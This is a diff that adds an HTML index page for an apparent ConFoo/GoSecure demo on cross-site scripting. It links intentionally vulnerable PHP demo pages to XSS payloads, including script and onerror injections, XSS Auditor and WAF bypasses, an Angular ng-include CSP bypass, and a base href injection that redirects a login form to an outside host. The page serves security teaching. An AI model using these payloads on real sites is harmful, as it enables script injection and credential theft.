@@ -1,0 +1,44 @@
+
+
+<img src="confoo.png" width="400px">  
+<img src="gosecure.png" width="100px">
+
+<br/><br/><br/>
+
+<h2>Basic examples</h2>
+<ul>
+<li><a href="basic1.php?name=Confoo">HTML context</a> <a href="basic1.php?name=<script>alert(1)</script>">[1]</a></li>
+<li><a href="basic2.php?name=Confoo">Attribute context</a> <a href="basic2.php?name=%22%20onload=%22alert%281%29">[1]</a></li>
+<li><a href="basic3.php?name=Confoo">Script context</a> <a href="basic3.php?name=%22;alert(1)//">[1]</a></li>
+<li><a href="basic4.php?name=Confoo&amp;version=11">Script context escaped</a> <a href="basic4.php?name=\&amp;version=,1);alert(1)//">[1]</a></li>
+</ul>
+
+<h2>Chrome XSS Auditor</h2>
+<ul>
+<li><a href="basic1.php?name=Confoo">Effective example</a> <a href="basic1.php?name=<script>alert(1)</script>">[1]</a></li>
+<li><a href="chrome-xss-dom.php?userId=Confoo">HTML attribute escaped with innerHTML</a> <a href="chrome-xss-dom.php?userId=<script>alert(1)</script>">[1]</a> <a href="chrome-xss-dom.php?userId=<img%20src=xx%20onerror=alert(1)>">[2]</a></li>
+<li><a href="chrome-xss-write.php?userId=<script>alert(1)</script>">HTML attribute unescaped with document.write()</a> <a href="chrome-xss-write.php?userId=%3Cimg%20src=xx%20onerror=alert(1)%3E">[1]</a> <a href="chrome-xss-write.php?userId=%3Cimg%20src=xx%20onerror=alert(1)">[2]</a></li>
+</ul>
+
+<h2>Edge/IE XSS Auditor</h2>
+
+<ul>
+<li><a href="edge-xss-attribute.php?userId=Confoo">HTML attribute not filter</a> <a href="edge-xss-attribute.php?userId=YOLO%22%20%%20autofocus=%22%22%20onfocus=%22alert(1)">[1]</a></li>
+</ul>
+
+<h2>Content Security Policy</h2>
+
+<ul>
+<li><a href="csp-fileupload.php">File upload</a></li>
+<li><a href="csp-fileupload-angular-import.php?userId=1">File upload + Angular</a> <a href="csp-fileupload-angular-import.php?userId=ng-include:'tgif.txt'">[1]</a></li>
+<li><a href="csp-googleapis.php">Google API</a></li>
+<li><a href="login.php?errorMsg=<b>System error</b>: The active directory is unavailable.">base href and form redirection</a> <a href="login.php?errorMsg=%3Cmarquee%3E%3Ci%3E%3Ch1%3EPwnD%20bY%20HaX000R!%20%3C/h1%3E%3C/i%3E%3C/marquee%3E">[1]</a> <a href="http://localhost/demo-confoo/login.php?errorMsg=%3Cbase%20href=%22http://xss.lol%22%3E">[2]</a></li>
+</ul>
+
+
+<h2>Misc</h2>
+
+<ul>
+<li><a href="transformation.php?name=Confoo">Custom WAF</a> <a href="transformation.php?name=<script>alert(1)</script>">[1]</a> <a href="transformation.php?name=<i<script><script>mg%20src=xx%20o<script>nerror=alert(1)>">[2]</a></li>
+</ul>
+
